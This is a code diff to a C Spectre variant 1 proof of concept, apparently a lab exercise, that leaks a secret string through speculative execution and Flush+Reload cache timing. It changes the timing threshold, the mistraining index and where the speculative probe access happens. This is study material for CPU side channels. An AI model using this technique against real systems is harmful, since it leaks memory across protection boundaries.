@@ -10,16 +10,15 @@ uint8_t temp = 0;
 char *secret = "Some Secret Value";   
 uint8_t array[256*4096];
 
-#define CACHE_HIT_THRESHOLD (100)
+#define CACHE_HIT_THRESHOLD (80)
 #define DELTA 1024
 
 // Sandbox Function
-uint8_t restrictedAccess(size_t x)
+void restrictedAccess(size_t x)
 {
+  static int tmp = 0;
   if (x < buffer_size) {
-     return buffer[x];
-  } else {
-     return 3;
+     tmp &= array[buffer[x] * 4096 + DELTA];
   } 
 }
 
@@ -43,7 +42,7 @@ void reloadSideChannelImproved() {
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
-    if (time2 <= CACHE_HIT_THRESHOLD && i != 3)
+    if (time2 <= CACHE_HIT_THRESHOLD && i != 4)
       scores[i]++; /* if cache hit, add 1 for this value */
   } 
 }
@@ -59,15 +58,13 @@ void spectreAttack(size_t larger_x) {
   for (i = 0; i < 100; i++) {
     _mm_clflush(&buffer_size);
     for (z = 0; z < 100; z++) { }
-    restrictedAccess(i % 10);  
+    restrictedAccess(4);  
   }
   // Flush buffer_size and array[] from the cache.
   _mm_clflush(&buffer_size);
-  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
   // Ask victim() to return the secret in out-of-order execution.
   for (z = 0; z < 100; z++) { }
-  s = restrictedAccess(larger_x);
-  array[s*4096 + DELTA] += 88;
+  restrictedAccess(larger_x);
 }
 
 int main() {
